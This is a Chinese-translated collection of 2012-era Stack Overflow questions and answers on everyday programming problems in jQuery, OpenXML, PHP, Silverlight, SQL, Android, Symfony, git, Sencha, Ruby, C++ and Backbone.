> 赞同：1
> 
> 时间：2012-08-13T13:58:13.180

如果您要添加的是数字，那么这应该可以：

```
function addAll() {
  var sum = 0;
  $('.add').each(function(){
    sum += isNaN(this.value) || $.trim(this.value) === '' ? 0 : parseFloat(this.value);
  });

  $('#total').html(sum);
}
$('.add').keyup(addAll); 
```

[演示](http://jsfiddle.net/DULYW/2/)

如果您希望它在页面加载时起作用，请`addAll`在`.ready()`函数中添加调用。这是完整的代码：

```
$(document).ready(function(){

  addAll();
  $('.add').keyup(addAll);  
})

function addAll() {
  var sum = 0;
  $('.add').each(function(){
    sum += isNaN(this.value) || $.trim(this.value) === '' ? 0 : parseFloat(this.value);
  });

  $('#total').html(sum);
} 
```

# c# - OpenXML 中的制表符

> ID：11935601
> 
> 赞同：5
> 
> 时间：2012-08-13T13:46:50.733
> 
> 标签：c#, .net, ms-word, openxml

我正在使用 OpenXML 将文本添加到段落节点。我正在包装 OpenXML 方法，并使用以下方法来附加文本，该方法适用于没有标记的文本。

```
 public void AddPlainParagraphText(string text)
    {
        m_wordprocessingDocument.MainDocumentPart.Document.Body.AppendChild(
            new Paragraph(
                new Run(
                    new Text(text))));
    } 
```

我知道对于诸如制表符之类的特殊字符，您需要使用 OpenXML 的[TabChar](http://msdn.microsoft.com/en-us/library/documentformat.openxml.wordprocessing.tabchar.aspx)类并将其附加到 Text 项。我试图弄清楚是否可以自动执行此操作，OpenXML 会在文本中看到 '\t'，并自动设置 XML 以通过 . 我想我可以用 \t 标记字符串，但是我必须搜索每种类型的标记字符。这可以自动完成吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T14:04:11.803

在收到文本时将它们拆分，然后在每个 '\t' 上添加

```
var stringArray = text.Split('\t');

var paragraph = new Paragraph();

for(var i = 0; i <= stringArray.Length; i++)
{
    paragraph.Append(new Run(new Text(stringArray[i])));

    if(i != stringArray.Length)
       paragraph.Append(new Run(new TabChar()));
}

m_wordprocessingDocument.MainDocumentPart.Document.Body.AppendChild(paragraph); 
```

**评论后编辑：确实应该将它们放入`Run`s**

# php - 如何将数组显示到列表中并返回它？

> ID：11935612
> 
> 赞同：-4
> 
> 时间：2012-08-13T13:47:15.230
> 
> 标签：php, arrays

我有一个这样的数组：

```
Array ( 
       [0] => red
       [1] => blue 
       [2] => yellow 
       [3] => black 
       [4] => white ) 
```

所以我的问题是如何在其中显示值：

```
<li>red</li>
<li>blue</li>
<li>yellow</li>
<li>black</li>
<li>white</li> 
```

我希望列表成为函数中的返回值。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:50:02.280

琐碎的方式。

```
function foo($array) {
    $output = '';
    foreach($array as $element) {
        $output .= '<li>'.$element.'</li>';
    }   
    return $output;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:51:26.037

```
<?php

    $array = array('red', 'blue', 'yellow', 'black', 'white');

    foreach($array as $value) {
        echo "<li>$value</li>";
    }

?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T13:49:13.977

简单的方法：

```
echo '<li>' . join('</li><li>', $array) . '</li>'; 
```

如果`newline`有必要，那么

```
 echo '<li>' . join("</li><li>\n", $array) . '</li>'; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T13:54:03.603

[PHP 手册 foreach](http://php.net/manual/en/control-structures.foreach.php)

这是您需要的链接，以及如何执行此操作的示例：

```
<?php
$myarray = array('red','blue','yellow','black','white');

foreach($myarray as $key=>$val)
{
    print('<li>' . $val . '</li>'); 
}
?> 
```

或者，如果您希望在 PHP 之外打印 HTML（就像我一样），您可以这样做：

```
<?php
$myarray = array('red','blue','yellow','black','white');

foreach($myarray as $key=>$val)
{
    ?>
    <li><?=$val?></li>
    <?php
}
?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T13:55:08.037

```
$arr= ( 
       '0' => 'red'
       '1' => 'blue' 
       '2' => 'yellow' 
       '3' => 'black' 
       '4' => 'white' );
$list_html= li_function($arr);

function li_function($arr)
{
  foreach($arr as $key=>$values)
  {
      $str .= '<li>'.$values.'</li>';
  }
  return $str;
} 
```

您可以在[http://www.phpsyntax.blogspot.in找到更多信息](http://www.phpsyntax.blogspot.in)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-13T16:29:07.180

您通常应该使函数返回数组。

在您的*模板*中，您可以使用它。如果您还没有使用模板系统，请考虑使用像 Mustache 这样的轻量级系统。或者使用普通的 PHP：

```
<?php foreach($array as $value) { ?>
    <li><?php echo htmlspecialchars($value); ?></li>
<?php } ?> 
```

这将允许您稍后更改输出，而无需更改所有功能。

# silverlight - Silverlight：将 byte[] 转换为 BitmapImage 以“灾难性失败”结束

> ID：11935613
> 
> 赞同：1
> 
> 时间：2012-08-13T13:47:16.753
> 
> 标签：silverlight, bitmapimage, writeablebitmap, writeablebitmapex

我正在尝试在 Silverlight 中修改 BitmapImage，但碰巧遇到了“灾难性故障”！

首先，我加载一个图像并将其添加到 LayoutRoot。

```
BitmapImage source = new BitmapImage(new Uri("image.jpg", UriKind.Relative));
Image imageElement = new Image();
imageElement.Name = "imageElement";
imageElement.Source = source;
imageElement.Stretch = Stretch.None;
LayoutRoot.Children.Add(imageElement); 
```

这工作正常，图像正确显示在屏幕上。

接下来我要修改图像（例如：单击按钮后）。

在按钮单击方法中，首先，我从 LayoutRoot 中取出图像，然后使用 WriteableBitmap 类对其进行修改：

```
Image imageElement = (Image) LayoutRoot.Children[1];
WriteableBitmap writeableBitmap = new WriteableBitmap(imageElement, null);
writeableBitmap.ForEach((x,y,color) => Color.FromArgb((byte)(color.A / 2), color.R, color.G, color.B)); 
```

接下来，我使用给定的方法将其保存到字节数组缓冲区中：

```
byte[] buffer = writeableBitmap.ToByteArray(); 
```

这看起来也不错。缓冲区显示所有 ARGB 值，甚至 alpha 值也是通常值 127 的一半，就像它应该的那样！

在下一步中，我想将修改后的数据重新加载到 BitmapImage 中，最后加载到 Image 中，然后再次将其添加到 LayoutRoot 中：

```
BitmapImage modifiedSource = null;
try
{
    using (MemoryStream stream = new MemoryStream(buffer))
    {
        stream.Seek(0, SeekOrigin.Begin);
        BitmapImage b = new BitmapImage();
        b.SetSource(stream);
        modifiedSource = b;
    }
}
catch (Exception ex)
{
    MessageBox.Show(ex.ToString());
} 
```

我在这里找到了这段代码：[byte[] to BitmapImage in silverlight](https://stackoverflow.com/questions/3335819/byte-to-bitmapimage-in-silverlight)

作为最后一步，我将再次创建一个 Image 并将其添加到 LayoutRoot （就像我在开始时所做的那样：

```
Image modifiedImageElement = new Image();
modifiedImageElement.Name = "newImageElement";
modifiedImageElement.Source = modifiedSource;
modifiedImageElement.Stretch = Stretch.None;
LayoutRoot.Children.Add(modifiedImageElement); 
```

但最后一部分永远无法到达，因为发生了“灾难性故障”

```
b.SetSource(stream); 
```

行，说：

```
{System.Exception: Catastrophic failure (Ausnahme von HRESULT: 0x8000FFFF (E_UNEXPECTED))
   at MS.Internal.XcpImports.CheckHResult(UInt32 hr)
   at MS.Internal.XcpImports.BitmapSource_SetSource(BitmapSource bitmapSource, CValue& byteStream)
   at System.Windows.Media.Imaging.BitmapSource.SetSourceInternal(Stream streamSource)
   at System.Windows.Media.Imaging.BitmapImage.SetSourceInternal(Stream streamSource)
   at System.Windows.Media.Imaging.BitmapSource.SetSource(Stream streamSource)
   at SilverlightApplication1.MainPage.button1_Click(Object sender, RoutedEventArgs e)} 
```

我不知道出了什么问题。我在这里找到了一篇文章 [Silverlight: BitmapImage from stream throws exception (Catastrophic failure (Exception from HRESULT: 0x8000FFFF (E_UNEXPECTED)))](https://stackoverflow.com/questions/6627164/silverlight-bitmapimage-from-stream-throws-exception-catastrophic-failure-exc)，恰好有相同的异常，但是当我读到它时，似乎他只有在他上传了很多图片，对于少量图片来说，这对他来说效果很好。所以我仍然对如何解决这个问题一无所知？

大家有什么建议吗？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T21:20:13.140

我认为您正在崩溃，因为您从中重建图像的字节数组是 ARGB 值的“原始”数组，而该`Source`属性需要一个构成有效 PNG 或 JPG 文件的字节流。原始 ARGB 数据极不可能是有效的 PNG 或 JPG 文件，因为它几乎肯定不会包含每种格式所需的有效标题。

我无法重现崩溃；相反，`BitmapImage`当我运行您的代码时创建的 s`PixelWidth`都`PixelHeight`为零。这很可能是因为我使用的图像与您使用的图像不同。无论哪种方式，崩溃或不崩溃，这都不是理想的行为。

如果要将修改后的数据加载回 中`Image`，则无需创建`byte`数组。`Image`只需从`WriteableBitmap`对象创建一个：

```
 Image modifiedImage = new Image()
        {
            Source = writeableBitmap,
            Stretch = Stretch.None
        }; 
```

我用它在原始图像下方添加了图像的副本。与原始图像相比，修改后的图像具有“褪色”的外观，如果我将所有 alpha 通道值减半，这正是我所期望的。

如果确实需要将字节数组转换回图像，可以使用`FromByteArray`WriteableBitmapEx 中的扩展方法。然后，您可以`Image`如上所述创建一个。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:14:54.730

我之前遇到过这个异常：

1.  将不支持的图像类型传递给 silverlight 时：BMP、... 仅支持 JPG 和 PNG。请参阅[MSDN](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.bitmapimage%28v=vs.95%29.aspx)
2.  传递不正确的数据时（不是所有的流或格式不正确）

# sql - 使用 Access 2007 保持在 sql 视图中输入的查询订单结果视图

> ID：11935615
> 
> 赞同：0
> 
> 时间：2012-08-13T13:47:19.023
> 
> 标签：sql, ms-access-2007

如何保持查询顺序结果与 sql 视图中相同。我使用下面的sql来获取结果

```
SELECT TableName.NumBR
FROM TableName
WHERE 
NumBR = ""
OR NumBR Like "3101"
OR NumBR Like "3541"
OR NumBR Like "4381"
OR NumBR Like "AS3281"
OR NumBR Like "4260"
OR NumBR Like "4315"
OR NumBR Like "4330"
OR NumBR Like "4382"
OR NumBR Like "9410"
OR NumBR Like "9570"
OR NumBR Like "AS3710"
OR NumBR Like "AS4450"
OR NumBR Like "K400"
OR NumBR Like "3100"
OR NumBR Like "3130"
OR NumBR Like "3280"
OR NumBR Like "3495"
OR NumBR Like "3540"
OR NumBR Like "3610"
OR NumBR Like "3700"
OR NumBR Like "4110"
OR NumBR Like "4200"; 
```

但是当我希望保持在 sql 视图中输入的顺序时，结果总是按升序排列。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:52:38.160

您还没有选择订单，您已经创建了 where 语句。您可以使用带有自动编号的临时表作为您的标准，然后您可以将自动编号用于您的订单。

```
SELECT TableName.NumBR
FROM TableName
INNER JOIN temp 
ON TableName.NumBR = Temp.NumBR
ORDER BY Temp.ID 
```

# sql - SQL Server 中多个值中的最大值

> ID：11935620
> 
> 赞同：4
> 
> 时间：2012-08-13T13:47:28.443
> 
> 标签：sql, sql-server-2008, tsql

> **可能重复：**
> [SQL Server 相当于 Oracle LEAST？](https://stackoverflow.com/questions/1972051/sql-server-equivalent-to-oracle-least)
> [SQL Server 2008 中的功能类似于 mysql 中的 GREATEST？](https://stackoverflow.com/questions/4725823/function-in-sql-server-2008-similar-to-greatest-in-mysql)

我正在尝试找到与 oracle 的“GREATEST”功能等效的 SQL Server。

从给定的值列表中返回最大的东西（在这种情况下是时间戳）

示例：`greatest(timestamp1, temestamp2, timestamp3)` 将返回最新日期。

我可以在 SQL Server 中使用类似的东西吗？

谢谢！

# android - 安卓解绑服务

> ID：11935625
> 
> 赞同：1
> 
> 时间：2012-08-13T13:47:42.417
> 
> 标签：android, android-intent

您好，我有一个小聊天应用程序，它绑定到我的服务，该服务与我的服务器创建 tcp/ip 连接。我使用aidl顺便说一句。

我的问题是我不知道如何处理屏幕方向，尤其是在销毁方法上。

我希望我的服务一直在线，并且我不想在应用程序销毁时停止它。

现在我使用“onDestroy”方法 unbindService(conn) 来解决“泄漏的连接问题”。

在重新创建活动时销毁活动后，它会冻结。谢谢，这里有一些代码片段。

```
serviceIntent = new Intent(getApplicationContext(),ChatService.class);
    boolean result = bindService(serviceIntent, conn,Context.BIND_AUTO_CREATE);
    startService(new Intent(getApplicationContext(),ChatService.class));
    Log.d(TAG, "Service binded");

@Override
protected void onDestroy() {
    Log.d(TAG, "ON DESTROY");
    unbindService(conn);
    super.onDestroy();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:04:44.343

服务没有 UI，因此您可能会说这不取决于您的服务，而是取决于您的活动。返回`START_STICKY`其中`onStartCommand()`告诉您即使您取消绑定它也必须运行它，基本上您可以随时绑定/取消绑定到持久（在android OS决定终止它之前不会持久）运行服务。

在您的活动覆盖`onConfigurationChange()`方法中并在其中不执行任何操作，然后在您的清单中使用`android:configChanges="orientation"`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:57:15.287

查看一个`Service`和`startForeground()`（[链接](http://developer.android.com/reference/android/app/Service.html#startForeground%28int,%20android.app.Notification%29)）。如果您可以让您的`Service`死亡但重新启动，请查看`onStartCommand()`and `START_STICKY`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:01:11.580

这每次都会发生，就像你正在经历的那样。拥有一个 bindedService 实际上会尝试将该 Activity 保留在内存中的时间比其他的要长。我建议不要从 onDestory 中的服务解除绑定。我会在命令上取消绑定您的服务，例如注销按钮而不是生命周期事件。

因此，当您的屏幕旋转时，您不会取消绑定，它只会与已经运行的服务重新绑定。如果您的用户杀死了活动，那么服务应该在某个时候被清理，因为系统应该看到绑定的服务正在运行而没有附加任何东西，然后它将被系统清理。

# symfony - 路线的名称是强制性的吗？- Symfony2

> ID：11935631
> 
> 赞同：2
> 
> 时间：2012-08-13T13:47:50.907
> 
> 标签：symfony

抱歉这个愚蠢的问题，但我想知道路线的名称是否应该是强制性的，或者我可以随心所欲地称呼它。这是一个例子：

```
# app/config/routing.yml
blog_show:
    pattern:   /blog/{slug}
    defaults:  { _controller: AcmeBlogBundle:Blog:show } 
```

我在问路由的名称是否必须是**“blog_show”**，如果答案是肯定的 - 它来自哪里，或者我可以根据需要设置它（当然我知道称它为purple_butterfly不好例如，但是 display_blog 呢？）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:05:56.083

你可以随意命名。

它用于生成 Url，您将需要它。

```
$this->generateUrl('blog_show') 
```

或者：

```
$this->generateUrl('purple_butterfly') 
```

# git - 远程和本地存储库之间的“git diff”

> ID：11935633
> 
> 赞同：73
> 
> 时间：2012-08-13T13:47:57.743
> 
> 标签：git, github, git-diff

在提交拉取请求之前，我正在尝试`diff`使用 GitHub 存储库访问我的本地文件，因此我可以看到会显示什么。有没有一种准确的方法来做到这一点？

我假设 GitHub 的比较工具操纵了 Git 的`diff`.

* * *

## 回答 #1

> 赞同：149
> 
> 时间：2015-10-22T20:02:32.137

将本地工作目录与远程分支进行比较，例如*origin/master*：

1.  ***`git fetch origin master`***
    这告诉 git 从名为“origin”的远程获取名为“master”的分支。 `git fetch`不会**影响**您工作目录中的文件；它不会像这样做那样尝试合并更改`git pull`。
2.  ***`git diff --summary FETCH_HEAD`***
    获取远程分支时，可以通过 FETCH_HEAD 在本地引用它。上面的命令告诉 git 将工作目录文件与 FETCHed 分支的 HEAD 进行比较，并以摘要格式报告结果。摘要格式提供了更改的概述，通常是一个很好的开始方式。如果您想了解更多信息，请使用`--stat`而不是`--summary`.
3.  ***`git diff FETCH_HEAD -- mydir/myfile.js`***
    如果您想查看对特定文件（例如 myfile.js）的更改，请跳过该`--summary`选项并引用您想要的文件（或树）。

如前所述，`origin`引用远程存储库并`master`引用该存储库中的分支。默认情况下，git 使用`origin`远程的名称，因此如果您这样做`git clone <url>`，它将默认调用该远程`origin`。用于`git remote -v`查看`origin`指向的内容。

您可能拥有多个遥控器。例如，如果您在 GitHub 上“分叉”一个项目，您通常需要远程引用原始项目以及您自己的分叉。假设您创建`https://github.com/yourusername/someproject`为`https://github.com/theoriginal/someproject`. 按照惯例，您将远程命名为原始 repo `upstream`，而您自己的 fork 将命名为`origin`. 如果您在 GitHub 上对 fork 进行更改并希望在本地获取这些更改，您将使用`git fetch origin master`. 如果`upstream`在进行更多更改之前您需要在本地同步所做的更改，您将使用`git fetch upstream master`.

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2012-08-13T13:50:08.253

不要做`pull`：

*   do a `fetch`（语法与 相同`git pull`，但不会自动合并）
*   `diff`在你的 dest 分支和另一个分支之间做一个
*   然后做一个`merge`如果你想

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-11-14T01:43:42.870

根据 OP 的评论，[他的“问题是 Windows 与 Unix LFs”的一部分](https://stackoverflow.com/questions/11935633/git-diff-between-remote-and-local-repo#comment15900549_11935633)，这应该会有所帮助：

您可以使用以下配置命令告诉`git-diff`忽略[EOL](https://en.wikipedia.org/wiki/Newline)代码的差异。

```
git config --global core.whitespace cr-at-eol 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2018-11-22T14:46:11.473

您可以使用：`git diff remote/my_topic_branch my_topic_branch`

`my_topic_branch`您的主题分支在哪里。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-10-15T01:13:27.273

EG git diff master origin/master

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-02-11T17:27:57.140

**需要记住的重要一点：** Git diff 将显示两个提交的分支（远程或本地）之间的差异。

**步骤 1) - 提交本地**

所以第一步要做的是确保你已经提交了你的本地存储库。您可以运行`git status`以查看是否还有任何文件。

如果您需要添加文件，请运行`git add {filename}`或添加所有文件`git add .`。然后你可以运行 a `git commit -m "message"`来提交你的本地文件。

**步骤 2) - 从远程获取您的分支**

您可以使用 `git fetch origin master`. 如果您看到如下消息，您就可以开始了。

```
branch            master     -> FETCH_HEAD 
```

> 请注意，origin 是存储库，master 是该存储库中的分支。

**步骤 3 检查差异**

现在您可以`git diff --summary FETCH_HEAD`或 `git diff origin/master master --summary`也可以看到您的更改。

# clojure - 如何使用 Incanter 将数据拟合到分布

> ID：11935640
> 
> 赞同：4
> 
> 时间：2012-08-13T13:48:29.677
> 
> 标签：clojure, distribution, incanter

有没有一种很好的方法可以使用类似于 R 中的 fitdistr 的 Incanter 将数据拟合到分布？

# javascript - Sencha 2.0 和 Codeigniter RESTful API 生成 Uncaught SyntaxError: Unexpected token ：

> ID：11935642
> 
> 赞同：0
> 
> 时间：2012-08-13T13:48:32.687
> 
> 标签：javascript, json, api, codeigniter, sencha-touch

我正在尝试使用从 codeiniter restful api 生成的（JSON）数据来提供 sencha。我做了基于 [Net.tuts API CI TUTORIAL的 RESTful API](http://net.tutsplus.com/tutorials/php/working-with-restful-services-in-codeigniter-2/)

我收到错误 Uncaught SyntaxError: Unexpected token : Here is my Sencha code and CI Code

**CI代码**

```
function user_get()
    {
      if(!$this->get('id'))  
      {  
            $this->response(NULL, 400);  
      }  

        $user = $this->user_model->get( $this->get('id') );  

        if($user)  
        {  
            $this->response($user, 200); // 200 being the HTTP response code  
        }  

        else  
        {  
            $this->response(NULL, 404);  
        }     
    } 
```

**生成的 JSON**

```
{
name: "ALEX JOHN",
country: "USA",
city: "NY"
} 
```

**煎茶代码**

```
Ext.application({
    name: 'Sencha',

    launch: function() {

    Ext.create('Ext.DataView', {

    fullscreen: true,
    store: {
        autoLoad: true,
        fields: ['name', 'country','city'],

        proxy: {
            type: 'jsonp',
            url: 'http://localhost/rest_api/index.php/users/user/id/2',
            callbackKey: 'callback',
            callback: function(result) {
              console.log(result)  ;
            },
            reader: {
                type: 'json'
            }
        }
    },

    itemConfig: {
        tpl: '<p>{city}</p>'
    }
});
    }
}); 
```

我无法弄清楚该区域来自哪里。它来自我的 JSON 数据格式吗？ sencha 是如何使用它的？请有人帮助。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T22:05:34.133

如果您请求 JSONP，则需要将返回的 JSON 包装在回调中。在您的控制器中，尝试将您的有效响应替换为：

```
//Is the GET field callback set?  If so, wrap the user object in it
if (isset($_GET['callback'])){
  $user=$_GET['callback'].'('.json_encode($user).')';
  //And manually create the response 
  header("Status: 200 OK"."\r\n");
  header("Date: ".gmdate(DATE_RFC822)."\r\n");
  header("Content-Type: application/javascript charset=UTF-8\r\n");
  header("Content-Length: " . strval(strlen($user))."\r\n");
  echo $user;
} else  //Use thhe API to gnerate the response as normal
$this->response($user, 200); 
```

# ruby - 错误：使用 pik install ruby 1.9.3 调用 nil:NilClass 的私有方法“gsub”

> ID：11935644
> 
> 赞同：2
> 
> 时间：2012-08-13T13:48:36.697
> 
> 标签：ruby, jruby, pik

在 Windows 7 机器上，我安装了 jruby 1.6.7，然后使用“gem install pik”安装了 pik。然后我运行了正确安装 pik 的 pik_install C:\bin。我可以正确运行“pik ls”命令。

`C:\Users\nir>pik ls * 167: jruby 1.6.7 (ruby-1.8.7-p357) (2012-02-22 3e82bc8) (Java HotSpot(TM)...`

我的路径是：- `C:\Users\nir>echo %PATH%` `C:\Program Files\Java\jdk1.7.0\bin; C:\bin;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\jruby-1.6.7\bin;C:\cygwin\bin;`

但是，当我运行“pik install ruby​​ 1.9.3”命令时，出现以下错误：- `C:\Users\nir>pik install ruby 1.9.3`

有一个错误：

```
 Error: private method 'gsub' called for nil:NilClass

 in: pik/commands/install_command.rb:24:in `execute'
 in: pik_runner:33` 
```

--- 安装的 pik 版本是 0.2.8。我已经禁用了防火墙设置。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T05:37:48.123

此问题已得到解决。它与防火墙设置有关。

我之前在 .gemrc 文件中进行了此设置以包括：-

gem: --http-proxy=http://ourproxyserveraddress.com:8080

但是，它没有用。以下设置解决了该问题：-

1) 控制面板\系统和安全\系统（我的电脑\系统属性）-> 高级系统设置。

2) 创建一个系统环境变量 HTTP_PROXY，其中包含代理服务器的 IP 地址和端口号。您将在浏览器设置 - 工具 -> 连接 -> 局域网设置 -> 代理服务器中找到有关代理服务器的信息

# c++ - 在一组数据中找到最小的数字

> ID：11935645
> 
> 赞同：2
> 
> 时间：2012-08-13T13:48:38.300
> 
> 标签：c++

我有以下形式的一组数据：

```
a1 b1 c1 d1
a2 b2 c2 d2
...
an bn cn dn 
```

我的目标是找到 c 列具有最小值的行。

我做了以下事情：

```
const int limit=100000;
float Array[limit][4];

int main() {

  double a, b, c, d, smallest, ref1, ref2;

  ifstream in("data.dat");

  int idx=-1, point;

  while(!in.eof()) {

    idx++;
    in >> a >> b >> c >> d;

    Array[idx][0]=a; Array[idx][1]=b; Array[idx][2]=c; Array[idx][3]=d;

} \\end of while

in.close();

   int count=idx;

   for(int i=1; i<count; i++) {

        ref1= Array[0][2];
        ref2 = Array[i][2];

        if(ref2 < ref1) {ref1 = ref2; point=i;}  //I thought this will save the smallest value 

         smallest = ref1; point= i;

} \\end for

cout << "point" << Array[point][0] << Array[point][1] << .. etc.

return 0;

} 
```

但是，输出是数据中的最后一个点。（在输入这个问题时，我意识到 ref1 在读取新行时将始终是 Array[0][2]。所以现在我完全迷路了！）

如何将一个点保存为参考点，以便将其与其余数据进行比较，并且每次与较小的点进行比较时，它都会更改为较小的值？

**更新**：我通过 ref1=Array[0][2]; 解决了这个问题 出for循环。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T13:55:30.987

要证明您已找到一组值中的最小值，请将您的 for 循环更改为以下内容：

```
int smallest_val = std::numeric_limits<int>::max();

for(int i=0; i < idx; i++) 
{
    if (Array[i][2] < smallest_val)
        smallest_val = Array[i][2];
} 
```

基本上，您首先设置`smallest_val`为使用`std::numeric_limits<int>::max()`. 现在数组中的每个值都必须至少等于`smallest_value`或更小（没有什么可以更大）。当您遍历数组时，一旦您找到一个小于当前值的值`smaller_value`，您将正确地将值重新分配`smaller_value`给该新的较低值。通过从`int`类型可以表示的最大可能开始，您可以避免遇到最小值相互关联的问题。使用数学归纳法，这种类型的方法对于您在这里尝试做的事情是不必要的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T14:06:08.673

您应该像我在循环之外设置一个引用并更新最小的，顺便说一句，不要将浮点数与双精度数混合，但是这里是一个示例代码：

```
#include <iostream>
#include <fstream>

using namespace std;

const int limit=100000;
float Array[limit][4];

int main() {

  double a, b, c, d, smallest, ref1, ref2;

  ifstream in("data.dat");

  int idx=-1, point;

  while(!in.eof()) {

    idx++;
    in >> a >> b >> c >> d;

    Array[idx][0]=a;
    Array[idx][1]=b;
    Array[idx][2]=c;
    Array[idx][3]=d;
  } //end of while

  in.close();
  int i = 0;
  int count;
  smallest = Array[i][2];
  for( i=1; i<count; i++) {
    ref2 = Array[i][2];

    if(ref2 < smallest) {
      smallest = ref2;
      point=i;
    }
  }

  std::cout << "point" << Array[point][0] << " "
            << Array[point][1] << " "
            << Array[point][2] << " "
            << Array[point][3] << std::endl;

return 0;

} 
```

带数据文件

```
1 2 3 4
2 3 8 9
1 3 5 2
1 1 1 1
2 4 2 4
3 1 0 1 
```

高温高压

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T14:53:31.220

另一方面，输入循环控制不正确：

```
while(!in.eof()) { 
```

eof() 在读取失败之前不会被触发。在实践中，这意味着输入循环会额外执行一次，而您最后一次会得到无意义的值。

正确的测试是

```
while(in >> a >> b >> c >> d) { 
```

如果任何提取器失败（希望因为`in`在输入的末尾，while 循环将结束。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T13:58:47.203

这里的问题是您永远不会与最小的比较。您在 ref1 和 ref2 之间分配最小值，而不考虑以前的迭代。此外， ref1 始终是数据中的第一个值，因此如果最后一个值大于第一个值，则最小值始终是最后一个。将循环更改为 Jason 发布的内容将解决您的问题。

# jquery - Smooth Div Scroll Jquery Plugin无限循环不起作用

> ID：11935652
> 
> 赞同：0
> 
> 时间：2012-08-13T13:48:54.370
> 
> 标签：jquery, scroll, smooth-scrolling

我试图复制这个例子：

[http://www.smoothdivscroll.com/clickableLogoParade.html](http://www.smoothdivscroll.com/clickableLogoParade.html)

从插件。

但是，您会注意到，当滚动到达最后一个徽标“RADIO SHACK”时，它会停止。

我怎样才能使它成为一个真正的 ENDLESS 循环？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T11:15:22.507

我在这里看到了你的帖子，并决定看看有问题的页面。滚动条在 Radio Shack 标志处停止的原因是可滚动区域没有包含足够的标志来“四处走动”。因此，当它到达 Radio Shack 徽标并尝试在永无止境的队列中换下一个徽标时，没有可以切换到的免费（不可见）徽标。

我通过在可滚动区域添加更多徽标来解决此问题。如果您现在尝试[相同的演示页面（可点击徽标游行）](http://www.smoothdivscroll.com/clickableLogoParade.html)，它将正常工作。抱歉演示有问题！

**实现 Smooth Div Scroll 时的两个重要规则：**

1.  可滚动区域内所有元素的组合宽度需要大于滚动条的宽度。

2.  如果您使用自动滚动选项，除了规则 1，您还需要确保有足够的元素以便滚动条可以交换。

对于第 2 条规则，您可以想象一个人站在装满打印照片的传送带旁。每次照片最后从边缘掉下来，这个人就把它捡起来，跑到传送带的开头，把它放在那里。这在一个永无止境的循环中进行。

# javascript - Backbone.js - 从推文中删除模型时出现的奇怪问题。

> ID：11935657
> 
> 赞同：0
> 
> 时间：2012-08-13T13:49:07.753
> 
> 标签：javascript, backbone.js

我在使用backbone.js 时遇到了一些问题。虽然我所有的代码都有效，但我确实得到了一个例外： `TypeError: 'undefined' is not an object (evaluating '(e=this.models[c]).cid')`.

当模型数量超过限制时会发生异常，我在集合中调用 self.remove() 。

```
var Column = Backbone.Collection.extend({
    initialize: function(col) {
        var view = new ColumnView({
            id: "column_" + col.id,
            column: col
        });

        view.render();
    },

    comparator: function(tweet) {
        return tweet.get('created_at_time');
    },

    clean: function() {
        var self        = this;
        var total       = this.models.length;
        var threshold   = (total - window.config.threshold) - 1;

        if(threshold > 0) {
            console.log("Removing if tweet is older then " + threshold);
            this.models.forEach(function(tweet, index) {
                if(index < threshold) {
                    self.remove(tweet);
                }
            });
        }
    }
}); 
```

有谁知道发生了什么？错误发生在 safari 上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:07:53.583

猜测是因为您在迭代模型列表时删除了模型。

尝试

```
if (threshold > 0) {

    var removed = [];
    this.models.forEach(function (tweet, index) {
        if (index < threshold) {
            removed.push(tweet);
        }
    });
    this.remove(removed);
} 
```

或@mu 建议的变体

```
if (threshold > 0) {

    var removed =  this.filter(function(model, index) {
            return index < threshold;
    });
    this.remove(removed);
} 
```

或者在你的情况下可能更简单

```
if (threshold > 0) {
    this.remove(this.models.slice(0, threshold));
} 
```

# audio - 强制将 MP3 文件下载到默认下载文件夹的链接

> ID：11935672
> 
> 赞同：1
> 
> 时间：2012-08-13T13:49:56.680
> 
> 标签：audio, hyperlink, mp3, download

我在播放列表中有一些 MP3 文件，每个文件旁边都有一个链接，格式如下：

```
<a href="/music/track1.mp3"></a> 
```

用户可以右键单击链接并选择“下载链接文件”（或浏览器中的等效选项）。

我想要的是当用户单击链接（即标准的左键单击）时自动下载文件，而不是通过“另存为”对话框，而是通过用户浏览器的默认下载文件夹。

实现这一目标的最简单方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2019-01-28T09:13:14.280

如果您想要下载 mp3 文件而不是在同一个或另一个窗口中播放，只需在链接中添加一个“下载”属性，例如

```
<a href="www.mysite.com/uploads/mysong.mp3" download>download my song</a> 
```

或者

```
<a href="www.mysite.com/uploads/mysong.mp3" download="filename.mp3">download my song</a> 
```

“下载”属性是 HTML5 中“a”标签的新属性，最近的浏览器支持它。它也适用于其他文件类型，并且不限于 mp3 文件。

